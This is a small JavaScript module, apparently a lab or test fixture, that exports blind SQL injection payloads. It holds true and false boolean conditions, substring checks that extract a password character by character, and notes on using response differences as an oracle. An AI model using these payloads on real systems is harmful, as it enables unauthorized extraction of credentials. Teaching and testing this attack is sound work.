export const blindSqliPayloads = {
    trueConditions: [
        "guest' AND 1=1--",
        "guest' OR 1=1--",
        "guest' AND 'a'='a'--",
    ],

    falseConditions: [
        "guest' AND 1=2--",
        "guest' AND 'a'='b'--",
    ],

    valid: [
        "guest' AND substring(password,1,1)='s'--",
        "guest' AND substr(password,1,1)='s'--",
    ],

    invalid: [
        "guest-session",
        "admin",
        "guest' AND substring(password,1,1)='x'--",
    ],

    notes: [
        "Blind SQLi does not return visible database rows.",
        "The attacker compares true and false conditions.",
        "A response difference becomes a boolean oracle.",
    ],
};